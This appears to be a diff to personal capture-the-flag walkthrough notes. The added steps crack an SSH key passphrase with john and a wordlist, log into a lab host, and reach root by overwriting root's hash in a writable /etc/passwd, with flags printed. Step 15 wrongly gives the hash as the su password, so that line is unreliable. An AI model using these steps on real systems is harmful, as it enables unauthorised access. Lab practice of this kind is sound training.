@@ -46,7 +46,52 @@
 
     ssh2john key > key.hash
 
-9. crach key.hash
+9. crack key.hash
 
     john key.hash --wordlist=rockyou.txt
+
+    passphrase: unicorn
+
+10. ssh into server
+
+    ssh -i key mowree@10.10.20.50
+
+    passphrase: unicorn
+
+11. cat user.txt
+
+    results: 56Rbp0soobpzWSVzKh9YOvzGLgtPZQ
+
+12. Gain root access
+
+    cd /etc
+
+    cat passwd
+
+13. Create hashed password for root
+
+    openssl passwd david
+
+    results: $1$rdZX6iW5$Z0yApTP7256tc37Gx0vYU/
+
+14. Paste hashed password in "passwd" for root
+
+    nano /etc/passwd
+
+    ex.         :root:x:0:0:root:/root:/usr/bin/zsh
+
+    new         :root:$1$rdZX6iW5$Z0yApTP7256tc37Gx0vYU/:0:0:root:/root:/usr/bin/zsh
+
+15. Log in as Root
+
+    su
+
+    password: $1$rdZX6iW5$Z0yApTP7256tc37Gx0vYU/
+
+16. Get Root Flag
+
+    cat root.txt
+
+    flag= 36QtXfdJWvdC0VavlPIApUbDlqTsBM
+
 
